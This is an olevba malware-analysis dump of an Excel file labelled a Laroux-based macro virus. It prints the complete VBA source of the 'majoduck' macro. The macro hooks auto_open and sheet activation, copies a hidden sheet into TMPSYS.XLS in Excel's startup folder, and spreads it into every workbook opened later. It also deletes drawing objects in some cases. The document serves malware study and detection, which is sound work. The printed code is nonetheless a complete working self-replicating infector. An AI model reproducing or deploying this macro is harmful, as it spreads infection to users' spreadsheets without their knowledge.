olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-7f2084fd28a28ba89f4addc95404dae2dd5f194f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO majoduck.bas 
in file: Virus.MSExcel.Laroux-based-7f2084fd28a28ba89f4addc95404dae2dd5f194f - OLE stream: '_VBA_PROJECT_CUR/VBA/majoduck'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Rem Macro Majoduck ,Made in Slovakia
Rem       **************************
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    rr$ = Dir(c$ & "\" & "TMPSYS.XLS")
    If rr$ = "TMPSYS.XLS" Then pl = 1 Else pl = 0
    If ActiveWorkbook.Modules.Count > 0 Then q = 1 Else q = 0
    whichfile = pl + q * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    as1$ = ActiveWorkbook.Name
    Sheets("majoduck").Visible = True
    Sheets("majoduck").Select
    Sheets("majoduck").Copy
    
    newname$ = ActiveWorkbook.Name
    d1$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "TMPSYS.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir d1$
    Workbooks(as1$).Sheets("majoduck").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "tmpsys.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    as1$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    t$ = Workbooks(as1$).Sheets(1).Name
    If t$ <> "majoduck" Then
        Workbooks("TMPSYS.XLS").Sheets("majoduck").Copy before:=Workbooks(as1$).Sheets(1)
        Workbooks(as1$).Sheets("majoduck").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "tmpsys.xls!check_files"
    Case Else
    If ActiveWindow.ActivatePrevious = True Then GoTo 5
       GoTo 10
5   Range("ff1").Select
    ActiveCell.FormulaR1C1 = (",")
    ActiveSheet.DrawingObjects.Select
    Selection.Delete
    Range("a1").Select
10     End Select
   Rem Ludia,miluj�e všetkých a všetko rovnako,pretože iba v Láske je poznanie!!!.
 End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  majoduc
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

